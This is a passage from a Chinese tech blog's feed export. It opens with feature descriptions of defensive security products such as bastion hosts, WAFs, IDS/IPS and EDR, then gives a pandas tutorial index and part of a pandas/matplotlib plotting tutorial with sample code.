title="堡垒机"></a>堡垒机</h3><p>针对云主机、云数据库、网络设备等的运维权限、运维行为进行管理和审计。主要解决云上IT运维过程中操作系统账号复用、数据泄露、运维权限混乱、运维过程不透明等难题。</p><ul><li>登录功能<br>支持对X11、linux、unix、数据库、网络设备、安全设备等一系列授权账号进行密码的自动化周期更改，简化密码管理，让使用者无需记忆众多系统密码，即可实现自动登录目标设备，便捷安全。</li><li>账号管理<br>支持统一账户管理策略，能够实现对所有服务器、网络设备、安全设备等账号进行集中管理，完成对账号整个生命周期的监控，并且可以对设备进行特殊角色设置如：审计巡检员、运维操作员、设备管理员等自定义设置，以满足审计需求。</li><li>身份认证<br>提供统一的认证接口，对用户进行认证，支持身份认证模式包括动态口令、静态密码、硬件key、生物特征等多种认证方式，设备具有灵活的定制接口，可以与其他第三方认证服务器之间结合；安全的认证模式，有效提高认证的安全性和可靠性。</li><li>资源授权<br>提供基于用户、目标设备、时间、协议类型IP、行为等要素实现细粒度的操作授权，最大限度保护用户资源的安全。</li><li>访问控制<br>支持对不同用户进行不同策略的制定，细粒度的访问控制能够最大限度的保护用户资源的安全，严防非法、越权访问事件的发生。</li><li>操作审计<br>能够对字符串、图形、文件传输、数据库等全程操作行为审计；通过设备录像方式实时监控运维人员对操作系统、安全设备、网络设备、数据库等进行的各种操作，对违规行为进行事中控制。对终端指令信息能够进行精确搜索，进行录像精确定位。</li></ul><h3 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a>日志审计</h3><p>日志审计是针对大量分散设备的异构日志进行高效采集、统一管理、集中存储、统计分析，可协助企业满足等保合规要求、高效统一管理资产日志并为安全事件的事后取证据供依据。</p><ul><li>安全日志源管理<br>按照需要接入的日志源数量进行服务，提供多种日志接入方式，支持主动、被动采集。</li><li>日志采集<br>提供全面的日志采集能力：支持第三方安全设备、网络设备、数据库、windows/linux主机日志、web 服务器日志、虚拟化平台日志以及自定义等日志；提供强大的数据源管理功能:支持数据源的信息展示与管理、采集器的信息展示与管理以及agent 的信息展示与管理；提供分布式外置采集器、Agent 等多种日志采集方式；支持IPv4、IPv6 日志采集、分析以及检索查询。</li><li>日志存储<br>提供原始日志、范式化日志的存储，可自定义存储周期。</li><li>日志检索<br>提供丰富灵活的日志查询方式，支持全文.key-value、多kv布尔组合、括弧、正则、模糊等检索；提供便捷的日志检索操作，支持保存检索、从已保存的检索导入见多条件等。</li><li>报表管理<br>支持丰富的内置报表以及灵活的自定义报表模式，支持编辑报表的目录接口、引用统计项、设置报表标题、展示页眉和页码、报表配置基本内容（名称、描述等）；支持实时报表、定时报表、周期性任务报表等方式；支持html、pdf、word 格式的报表文件以及报表logo<br>的灵活配置。</li><li>日志分析<br>支持对各类应用系统产生的各类日志的分析功能。</li></ul><h3 id="数据库审计"><a href="#数据库审计" class="headerlink" title="数据库审计"></a>数据库审计</h3><p>数据库审计能够实时记录网络上的数据库活动，对数据库操作进行细粒度审计的合规性管理，对数据库遭受到的风险行为进行告警，对攻击行为进行阻断。通过对用户访问数据库行为的记录、分析和汇报，用来帮助用户事后生成合规报告、事故追根溯源，同时加强内外<br>部数据库网络行为记录，提高数据资产安全。</p><ul><li>实时告警<br>风险操作：支持通过操作类型、操作对象、风险等级等多种元素细粒度定义要求监控的风险操作行为。<br>SQL 注入：数据库安全审计提供SQL 注入库，可以基于SQL 命令特征或风险等级，发现数据库异常行为立即告警。<br>系统资源：当系统资源（CPU、内存和磁盘）占用率达到设置的告警阈值时立即告警。</li><li>多维度线索分析<br>行为线索：支持审计时长、语句总量、风险总量、风险分布、会话统计、SQL 分布等多维度的快速分析。<br>会话线索：支持根据时间、数据库用户、客户端等多角度进行分析。<br>语句线索：提供时间、风险等级、数据用户、客户端IP、数据库IP、操作类型、规则等多种语句搜索条件。</li><li>用户行为发现审计<br>关联应用层和数据库层的访问操作：提供内置或自定义隐私数据保护规则，防止审计日志中的隐私数据（例如，账号密码）在控制台上以明文显示。</li><li>精细化报表<br>会话行为：提供客户端和数据库用户会话分析报表。<br>风险操作：提供风险分布情况分析报表。<br>合规报表：提供满足数据安全标准（例如Sarbanes-Oxley）的合规报告。</li></ul><h3 id="网页防篡改"><a href="#网页防篡改" class="headerlink" title="网页防篡改"></a>网页防篡改</h3><p>网页防篡改是针对网站篡改攻击的防护，通过文件底层驱动技术对Web站点目录提供全方位的保护，为防止黑客、病毒等对目录中的网页、电子文档、图片、数据库等任何类型的文件进行非法篡改和破坏提供解决方案。</p><ul><li>篡改防护<br>同时对多台网站服务器文件，对同一台服务器内的多个web server，对同一web server内的多个virtual host进行防篡改；异地（非网站目录）保留篡改后页面快照，支持网站篡改检测；保护防篡改内嵌模块和守护进程。</li><li>防篡改分析<br>支持页面文件/结构/元素的哈希（MD5）值篡改检测、图片相似性比较。</li><li>攻击防护<br>能够防止SQL 数据库注入式攻击；能够防止跨站脚本漏洞；能够防止网站盗链。</li><li>发布备份<br>支持内容发布；支持实时同步；支持手动同步；可按照条件（按时间戳前，后，区间；按子文件夹；按WEB 服务器）；支持双机热备功能；实体间通信采用SSL 加密。</li><li>日志告警<br>保存系统日志；文件传输日志；支持篡改告警、SQL 注入告警、盗链告警，告警通知<br>支持手机短信通知、邮件通知、管理界面警示框；可通过图形报表综合统计和分析。</li></ul><h3 id="入侵检测系统"><a href="#入侵检测系统" class="headerlink" title="入侵检测系统"></a>入侵检测系统</h3><p>入侵检测系统是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取主动反应措施的网络安全系统。根据预先设定的安全策略，它是一种积极主动的安全防护技术。</p><ul><li>敏感数据外发检测<br>能够识别并检测特定格式文件的外发，同时能够检测出文件中包含的敏感数据，进行告<br>警，保护企业敏感数据，防止敏感数据泄露造成的损失。</li><li>客户端攻击检测<br>增加针对主流客户端应用程序的攻击签名规则，如Word、Excel、PDF、Firefox 等，增强客户终端应用程序的安全检测能力。</li><li>服务器非法外联检测<br>通过服务器的自学习功能或手动设置服务器正常外联行为，建立合法连接，能够检测服务器异于该合法连接的非法外联行为，及时产生告警信息通知网络管理人员，从而检测是否存在跳转等攻击行为。</li><li>僵尸网络检测<br>基于实时的信誉机制，结合企业级和全球信誉库，可有效检测恶意URL、僵尸网络，保护用户在访问被植入木马等恶意代码的网站地址时不受侵害，有效检测Web 威胁，并能及时发现网络中可能出现的僵尸网络主机和C&amp;C 连接。</li></ul><h3 id="Web应用防火墙"><a href="#Web应用防火墙" class="headerlink" title="Web应用防火墙"></a>Web应用防火墙</h3><p>基于对Web 流量的解码和分析，可应对Web 应用中的各类攻击，如SQL 注入、XSS注入、跨站请求伪造攻击、Cookie 篡改以及应用层Web 攻击等，能有效解决网页挂马、敏感信息泄露等安全问题，充分保障Web应用安全。通过精细的配置将多种Web安全检测方法连结成一套完整的安全体系，能够在IPv4、IPv6 及二者混合环境中抵御OWASP Top 10等各类Web安全威胁，通过服务化方式快速交付，保卫Web 应用免遭当前和未来的安全威胁。</p><ul><li>Web 应用攻击防护<br>内置多种防护策略，可选择进行 SQL 注入、XSS 攻击、命令注入、非法HTTP 协议请求、常见Web 服务器漏洞攻击、扫描防护等。</li><li>Web 漏洞<br>Web 服务器漏洞探测，Web 服务器漏洞扫描（模拟攻击，判断缺陷，自动配置对应规则），及时发现漏洞隐患。</li><li>注入攻击防护<br>SQL 注入防御、LDAP 注入防御、命令注入防护（OS 命令，webshell 等）、XPath 注入防御、Xml/Json 注入防御。</li><li>IP 访问控制<br>支持对指定IP 的加白和恶意IP 的封禁。</li><li>URL 访问控制<br>支持对URL 进行黑白名单控制。</li><li>爬虫防护<br>基于源IP 周期判断访问数，防护恶意访问。</li></ul><h3 id="下一代防火墙"><a href="#下一代防火墙" class="headerlink" title="下一代防火墙"></a>下一代防火墙</h3><p>下一代防火墙采用高度一体化的架构设计方案，将所有的安全特性纳入到一体化的安全引擎。将传统五元组访问控制与具有下一代防火墙特征能力有机地结合起来，提供一个全新的网络边界防护解决方案。</p><ul><li>应用、用户识别能力<br>可识别大部分应用，并可辅助用户对这些应用进行高效管理和筛查，包括5 维度分类组织，基于特性查询应用、自定义特殊应用等。</li><li>监控统计<br>对设备数据进行统计，并以柱状图、折线图、表格、报表、日志等方式呈现出来，帮助用户通过统计数据掌握设备状况，排查问题。</li><li>用户认证<br>对用户进行识别，通过认证的用户可以访问对应的管理资源。</li><li>访问控制<br>划分安全区域和非安全区域，区域之间的访问基于安全策略进行控制。</li><li>入侵防御<br>实时监控多种网络攻击并根据配置对网络攻击进行阻断等操作。</li><li>病毒过滤<br>探测各种病毒威胁，例如恶意软件、恶意网站等，并且根据配置对发现的病毒进行处理。</li><li>DNS 重定向<br>支持对某一域名重定向到另一域名的功能。</li><li>页面访问控制<br>针对不同用户的权限对页面的访问进行区别。</li><li>带宽管理<br>能够管理和优化网络带宽，提高用户的网络体验和带宽资源利用率。</li><li>云沙箱<br>基于云端架构的恶意软件虚拟运行环境，发现未知威胁，多重静态检测引擎快速过滤正常文件及已知威胁，提升沙箱检测效率。</li><li>僵尸网络 C&amp;C 防护<br>监控 C&amp;C 连接发现内网肉鸡，阻断僵尸网络/勒索软件等高级威胁进一步破坏。</li><li>IP 信誉库<br>识别过滤各种已知风险 IP，根据配置对风险IP 进行记录或阻断处理。</li><li>封账号<br>支持对网络账户封停的功能。</li><li>包过滤<br>支持对网络中的数据包的区分和限制功能。</li><li>授权管理<br>集中管理功能授权并可进行不同种类授权的统一下发。</li><li>传统防火墙功能特性<br>兼容传统防火墙功能特性，包括访问控制、日志报表、会话管理等。</li></ul><h3 id="入侵防护系统"><a href="#入侵防护系统" class="headerlink" title="入侵防护系统"></a>入侵防护系统</h3><p>入侵防护系统是一个监视网络或网络设备的网络资料传输行为的系统，能够深入网络数据内部，即时中断、调整或隔离一些有害数据流。入侵防护系统可主动拦截黑客攻击、据虫、网络病毒、后门木马、DoS 等恶意流量，保护企业信息系统和网络架构免受侵害，防止操作<br>系统和应用程序损坏或宕机。</p><ul><li>敏感数据保护<br>提供敏感数据识别、数据安全审计、数据脱敏、智能异常检测等数据安全能力，形成一体化的数据安全解决方案。</li><li>高级威胁防御<br>高级威胁防御能够基于敏感数的外泄、文件识别、服务器非法外联等异常行为检测，实现内网的高级威胁防御功能。</li><li>恶意文件防御<br>网络中存在大量恶意文件，通过网站文件服务器、邮件服务器实现传播，对企业网络安全构成潜在威胁。对网络中传送的文件，进行快速检测，比对文件信誉，对发现恶意的文件进行告警和阻断。</li><li>网址/网站检测分析<br>支持对网站的URL 进行检测，并分析其是否是恶意网能力。</li></ul><h3 id="防病毒"><a href="#防病毒" class="headerlink" title="防病毒"></a>防病毒</h3><p>防病毒可以对计算机病毒、木马和恶意软件等一切已知的对计算机有危害的程序代码进行清除，提供终端查杀病毒、软件管理、漏洞补丁、统一升级管理等功能。</p><ul><li><p>安全防御<br>能够精准识别、分析及响应病毒传播、0day 攻击及APT 攻击等异常行为。</p></li><li><p>主机防火墙<br>支持对IP、端口协议及访问方向等维度过滤，能智能识别网络协议，同时可通过IP 黑<br>白名单，控制终端只能访问指定目标地址，或指定来源IP 地址访问。</p></li><li><p>漏洞加固<br>实时扫描记录终端的操作系统及常用应用软件漏洞，掌握全网终端漏洞情况及补丁修复。</p></li><li><p>勒索病毒防御<br>基于HIPS 的勒索者主动防御机制，蠕虫病毒、勒索病毒、宏病毒等已知未知威胁防范无忧。</p></li><li><p>安全审计<br>对攻击、病毒及漏洞等终端运行信息，以及上网行为、U 盘使用及文件操作等终端行为信息进行统一收集。</p></li><li><p>软件管理<br>记录全网安装软件清单以及每种软件安装的终端明细，以及软件使用时长。</p></li><li><p>流量管控<br>对终端流量管理包括总流量、上行及下行等管理，同时支持升级下载及日志上传等细粒度的流量管理。</p></li></ul><h3 id="终端检测与响应"><a href="#终端检测与响应" class="headerlink" title="终端检测与响应"></a>终端检测与响应</h3><p>利用终端检测响应，对终端的运行状态进行检测和监控，对进程、文件和配置等进行分析，对异常行为进行处理，确保主机安全，从而实现东西向防护。</p><ul><li>病毒及恶意程序防护<br>基于文件动作行为特征模型分析查杀，主动防御型查杀，文件黑白名单管理，文件多算法(MD5、SHA1、SHA256)校验。</li><li>攻击与威胁防护<br>检测模式，拦截模式，支持端口扫描、泛洪攻击、TCP 洪水攻击、漏洞攻击、注册表安全检测等。</li><li>主机网络访问隔离<br>基于主机维度，定义出入站网络访问，能自定义网络访问对象和端口对象，并记录违规访问日志，可追溯网络访问发起的进程及进程详细路径和进程文件安全性。</li><li>终端环境强控<br>通过设定终端运行的白环境，达到除白名单外的文件无法运行。</li><li>安全基线检查<br>同时含盖 Windows 和Linux 平台，支持帐号与口令检查、密码生存周期检查、远程登录检查、网络与服务检查、日志审计检查、防火墙检查、系统安全配置检查等内容，核查项完全满足工信部等单位要求。</li><li>沙箱防护<br>云端沙箱检查结果查询，用户本地上传文件至沙箱。</li></ul><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas快速入门指南</title>
      <link href="/posts/17215b2c/"/>
      <url>/posts/17215b2c/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220223/pandas_logo.png" alt="pandas"></p><p>Pandas 是一个开源的第三方 Python 库，从 Numpy 和 Matplotlib 的基础上构建而来，享有数据分析“三剑客之一”的盛名（NumPy、Matplotlib、Pandas）。是学习数据分析、AI机器学习必学组件之一。<br>Pandas 这个名字来源于面板数据（Panel Data）与数据分析（data analysis）这两个名词的组合。在经济学中，Panel Data 是一个关于多维数据集的术语。Pandas 对数据的处理是为数据的分析服务的，它所提供的各种数据处理方法、工具是基于数理统计学出发，包含了日常应用中的众多数据分析方法。</p><p>Pandas 可以实现复杂的处理逻辑，这些往往是 Excel 等工具无法处理的，还可以自动化、批量化，对于相同的大量的数据处理我们不需要重复去工作。Pandas 的出现使得 Python 做数据分析的能力得到了大幅度提升，它主要实现了数据分析的五个重要环节：</p><ul><li>加载数据 </li><li>整理数据 </li><li>操作数据 </li><li>构建数据模型 </li><li>分析数据</li></ul><p>主要特点</p><ul><li>它提供了一个简单、高效、带有默认标签（也可以自定义标签）的 DataFrame 对象。 </li><li>能够快速得从不同格式的文件中加载数据（比如<br>Excel、CSV 、SQL文件），然后将其转换为可处理的对象； </li><li>能够按数据的行、列标签进行分组，并对分组后的对象执行聚合和转换操作；</li><li>能够很方便地实现数据归一化操作和缺失值处理； </li><li>能够很方便地对 DataFrame 的数据列进行增加、修改或者删除的操作；</li><li>能够处理不同格式的数据集，比如矩阵数据、异构数据表、时间序列等；</li><li>提供了多种处理数据集的方式，比如构建子集、切片、过滤、分组以及重新排序等。</li></ul><p>本教程梳理了快速入门pandas的一些知识点。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220223/pandas.png" alt="pandas快速入门"></p><p><a href="http://xiejava.ishareread.com/posts/531458d5/" target="_blank" rel="noopener">一、pandas数据结构(Series和DataFrame)</a></p><p><a href="http://xiejava.ishareread.com/posts/4864590d/" target="_blank" rel="noopener">二、pandas数据加载(csv、excel、json、mysql、webAPI)</a></p><p><a href="http://xiejava.ishareread.com/posts/808d8fe8/" target="_blank" rel="noopener">三、pandas基本操作之数据访问(查看与检索)</a></p><p><a href="http://xiejava.ishareread.com/posts/16c9fc17/" target="_blank" rel="noopener">四、pandas数据分析之排序和排名(sort和rank)</a></p><p><a href="http://xiejava.ishareread.com/posts/a87a78e2/" target="_blank" rel="noopener">五、pandas数据清洗之处理缺失、重复、异常数据</a></p><p><a href="http://xiejava.ishareread.com/posts/2c80aac2/" target="_blank" rel="noopener">六、pandas数据处理之数据转换(映射map、替换replace、重命名rename)</a></p><p><a href="http://xiejava.ishareread.com/posts/f44191db/" target="_blank" rel="noopener">七、pandas数据分析之数据运算(逻辑运算、算术运算、统计运算、自定义运算)</a></p><p><a href="http://xiejava.ishareread.com/posts/e7d4d6e1/" target="_blank" rel="noopener">八、pandas数据处理之合并与拼接</a></p><p><a href="http://xiejava.ishareread.com/posts/dd24116d/" target="_blank" rel="noopener">九、pandas数据分析之分组聚合</a></p><p><a href="http://xiejava.ishareread.com/posts/bc5826bd/" target="_blank" rel="noopener">十、pandas数据分析之数据重塑透视(stack、unstack、melt、pivot)</a></p><p><a href="http://xiejava.ishareread.com/posts/e8cac912/" target="_blank" rel="noopener">十一、pandas数据分析之数据绘图</a></p><p>学习pandas最好的资料肯定是pandas的官网  <a href="https://pandas.pydata.org/docs/user_guide/index.html" target="_blank" rel="noopener">https://pandas.pydata.org/docs/user_guide/index.html</a></p><p>书籍推荐pandas的作者写的《利用python进行数据分析》</p><hr><p>本教程作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas数据分析之数据绘图</title>
      <link href="/posts/e8cac912/"/>
      <url>/posts/e8cac912/</url>
      
        <content type="html"><![CDATA[<p>一图胜千言，将信息可视化（绘图）是数据分析中最重要的工作之一。它除了让人们对数据更加直观以外，还可以帮助我们找出异常值、必要的数据转换、得出有关模型的想法等等。pandas 在数据分析、数据可视化方面有着较为广泛的应用。本文将通过实例介绍pandas的数据绘图。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220216/pandas%E6%95%B0%E6%8D%AE%E7%BB%98%E5%9B%BE.png" alt="pandas数据绘图"></p><p>pandas的数据可视化依赖于matplotlib模块的pyplot类，matplotlib在安装Pandas会自动安装。Matplotlib可以对图形做细节控制，绘制出出版质量级别的图形，通过Matplotlib，可以简单地绘制出常用的统计图形。pandas 对 Matplotlib 绘图软件包的基础上单独封装了一个plot()接口，通过调用该接口可以实现常用的绘图操作。<br>让我们先来认识mataplotlib图形的基本构成。</p><h1 id="一、matplotlib图形基本构成"><a href="#一、matplotlib图形基本构成" class="headerlink" title="一、matplotlib图形基本构成"></a>一、matplotlib图形基本构成</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">data=np.arange(<span class="number">10</span>)</span><br><span class="line">plt.plot(data)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220216/matplotlib%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95.png" alt="matplotlib.plot()"></p><p>通过引入matplotlib模块的pyplot类，将数据传入plot()的接口，就可以将数据以图形化的方式展示出来。Matplotlib 生成的图形主要由以下几个部分构成：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220216/matplotlib%E5%9B%BE%E5%BD%A2%E5%9F%BA%E6%9C%AC%E7%BB%84%E6%88%90%E9%83%A8%E5%88%86.png" alt="绘图基本结构"></p><ul><li>Figure：指整个图形，您可以把它理解成一张画布，它包括了所有的元素，比如标题、轴线等； </li><li>Axes：绘制 2D图像的实际区域，也称为轴域区，或者绘图区； </li><li>Axis：指坐标系中的垂直轴与水平轴，包含轴的长度大小（图中轴长为 7）、轴标签（指 x轴，y轴）和刻度标签； </li><li>Artist：在画布上看到的所有元素都属于 Artist对象，比如文本对象（title、xlabel、ylabel）、Line2D 对象（用于绘制2D图像）等。</li></ul><p>了解matplotlib图形的基本构成非常重要，绘图就是通过matplotlib提供的方法来定义和设置这些基本图形的构成元素来将数据显示在这些元素中。</p><h1 id="二、matplotlib显示中文"><a href="#二、matplotlib显示中文" class="headerlink" title="二、matplotlib显示中文"></a>二、matplotlib显示中文</h1><p>Matplotlib 默认不支持中文字体，这因为 Matplotlib 只支持 ASCII 字符，但中文标注更加符合中国人的阅读习惯。下面介绍如何在 Windows 环境下让 Matplotlib 显示中文。</p><h2 id="1、方法一：临时重写配置文件（临时）"><a href="#1、方法一：临时重写配置文件（临时）" class="headerlink" title="1、方法一：临时重写配置文件（临时）"></a>1、方法一：临时重写配置文件（临时）</h2><p>通过临时重写配置文件的方法，可以解决 Matplotlib 显示中文乱码的问题，代码如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.rcParams[<span class="string">"font.sans-serif"</span>]=[<span class="string">"SimHei"</span>] <span class="comment">#设置字体</span></span><br><span class="line">plt.rcParams[<span class="string">"axes.unicode_minus"</span>]=<span class="literal">False</span> <span class="comment">#该语句解决图像中的“-”负号的乱码问题</span></span><br></pre></td></tr></table></figure><h2 id="2、方法二：修改配置文件-（永久）"><a href="#2、方法二：修改配置文件-（永久）" class="headerlink" title="2、方法二：修改配置文件 （永久）"></a>2、方法二：修改配置文件 （永久）</h2><p>通过直接修改配置文件的方法，可以一劳永逸的解决 Matplotlib 的中文乱码问题。注意此过程在 Windows 环境下进行。<br>Matplotlib 从配置文件 matplotlibrc 中读取相关配置信息，比如字体、样式等，因此我们需要对该配置文件进行更改。使用如下代码查看 matplotlibrc 所在的目录：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib</span><br><span class="line">matplotlib.matplotlib_fname()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220216/matplotlib_fname.png" alt="matplotlib_fname"></p><p>打开配置文件后，找到以下信息：<br>#font.family: sans-serif<br>#font.serif: DejaVu Serif, Bitstream Vera Serif, Computer Modern Roman, New Century Schoolbook, Century Schoolbook L, Utopia, ITC Bookman, Bookman, Nimbus Roman No9 L, Times New Roman, Times, Palatino, Charter, serif<br>修改配置将#注释去掉，并将微软雅黑Microsoft  YaHei的字体给加上。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220216/matplotlib%E8%AE%BE%E7%BD%AE%E5%AD%97%E4%BD%93.png" alt="微软雅黑"><br>最后，在windows的字体目录中复制中文字体微软雅黑：<br>C:\Windows\Fonts\Microsoft YaHei UI<br>将微软雅黑的字体复制粘贴到matplotlib的字体库中，字体库路径就在matplotlibrc 所在的目录下<br>D:\Anaconda3\Lib\site-packages\matplotlib\mpl-data\fonts\ttf<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220216/matplotlib%E6%8B%B7%E8%B4%9D%E5%AD%97%E4%BD%93.png" alt="复制字体"><br>如果是jupyter notbook重启启动jupyter notbook让它重新读取配置文件即可。</p><h1 id="三、pandas绘图"><a href="#三、pandas绘图" class="headerlink" title="三、pandas绘图"></a>三、pandas绘图</h1><p>数据分析将数据进行可视化绘图展示离不开数据，pandas的两大数据结构Series和DataFrame都提供了相应的方法很方便的进行数据的可视化绘图展示。</p><h2 id="1、数据"><a href="#1、数据" class="headerlink" title="1、数据"></a>1、数据</h2><p>pandas 提供了 plot() 方法可以快速方便地将 Series 和 DataFrame 中的数据进行可视化。</p><h3 id="a-Series"><a href="#a-Series" class="headerlink" title="a) Series"></a>a) Series</h3><p>Series 使用 plot 时 x 轴为索引，y 轴为索引对应的具体值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">series_data=pd.Series(np.random.randn(<span class="number">10</span>),index=range(<span class="number">10</span>))</span><br><span class="line">series_data</span><br><span class="line">series_data.plot()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220216/Series%E7%BB%98%E5%9B%BE.png" alt="Series绘图"></p><h3 id="b-DataFrame"><a href="#b-DataFrame" class="headerlink" title="b) DataFrame"></a>b) DataFrame</h3><p>DataFrame 使用 plot 时 x 轴为索引，y 轴为索引对应的多个具体值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df_staff = pd.read_excel(<span class="string">'D:\\Python\\study\\pythontest\\pandastest\\数据集\\staff_sale_byQ.xlsx'</span>)</span><br><span class="line">df_staff</span><br><span class="line">df_staff.plot()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220216/DataFrame%E7%BB%98%E5%9B%BE.png" alt="DataFrame绘图"><br>plot()可以通过传入x和y指定显示具体的列数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指定X轴及y显示的列数据</span></span><br><span class="line">df_staff.plot(x=<span class="string">'季度'</span>,y=[<span class="string">'张三'</span>,<span class="string">'李四'</span>])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220216/DataFrame%E7%BB%98%E5%9B%BE1.png" alt="dataframe指定x和y"></p><h2 id="2、图形"><a href="#2、图形" class="headerlink" title="2、图形"></a>2、图形</h2><p>plot 默认为折线图，折线图也是最常用和最基础的可视化图形，足以满足我们日常 80% 的需求。<br>除了使用默认的线条绘图外，还可以使用其他绘图方式，如下所示：</p><ul><li>柱状图：bar() 或 barh() </li><li>箱形图：box() </li><li>区域图：area() </li><li>饼状图：pie() </li><li>散点图：scatter()</li><li>直方图：hist()</li></ul><h3 id="a-柱状图"><a href="#a-柱状图" class="headerlink" title="a) 柱状图"></a>a) 柱状图</h3><p>柱状图（bar chart），使用与轴垂直的柱子，通过柱形的高低来表达数据的多少，适用于数据的对比，在整体中也能看到数据的发展变化趋势。<br>DataFrame 可以直接调用 plot.bar() 生成折线图，与折线图类似，x 轴为索引，其他数字类型的列为 y 轴上的条形，可以设置参数stacked=True生成柱状堆叠图<br>df.plot.bar()<br>df.plot.barh() # 横向<br>df[:5].plot.bar(x=’name’, y=’Q4’) # 指定xy轴<br>df[:5].plot.bar(‘name’, [‘Q1’, ‘Q2’]) # 指定xy轴</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#柱状图</span></span><br><span class="line">df_staff.plot.bar(x=<span class="string">'季度'</span>,y=[<span class="string">'张三'</span>,<span class="string">'李四'</span>,<span class="string">'王五'</span>]) </span><br><span class="line"><span class="comment">#柱状图可以设置参数stacked=True生成柱状堆叠图</span></span><br><span class="line">df_staff.plot.bar(x=<span class="string">'季度'</span>,y=[<span class="string">'张三'</span>,<span class="string">'李四'</span>,<span class="string">'王五'</span>],stacked=<span class="literal">True</span>) </span><br><span class="line"><span class="comment">#通过barh()方法可以绘制水平柱状图</span></span><br><span class="line">df_staff.plot.barh(x=<span class="string">'季度'</span>,y=[<span class="string">'张三'</span>,<span class="string">'李四'</span>,<span class="string">'王五'</span>],stacked=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220216/%E6%9F%B1%E7%8A%B6%E5%9B%BE.png" alt="柱状图"></p><h3 id="b-箱形图"><a href="#b-箱形图" class="headerlink" title="b) 箱形图"></a>b) 箱形图</h3><p>箱形图（Box Chart）又称盒须图、盒式图或箱线图，是一种用作显示一组数据分布情况的统计图。Series.plot.box() 、 DataFrame.plot.box(), 和 DataFrame.boxplot() 都可以绘制箱形图。<br>从箱形图中我们可以观察到：</p><ul><li>一组数据的关键值：中位数、最大值、最小值等。</li><li>数据集中是否存在异常值，以及异常值的具体数值。 </li><li>数据是否是对称的。</li><li>这组数据的分布是否密集、集中。 </li><li>数据是否扭曲，即是否有偏向性。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_staff.plot.box(x=<span class="string">'季度'</span>,y=[<span class="string">'张三'</span>,<span class="string">'李四'</span>,<span class="string">'王五'</span>])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220216/%E7%AE%B1%E5%9E%8B%E5%9B%BE.png" alt="箱形图"></p><h3 id="c-区域图"><a href="#c-区域图" class="headerlink" title="c) 区域图"></a>c) 区域图</h3><p>区域图（Area Chart），又叫面积图。 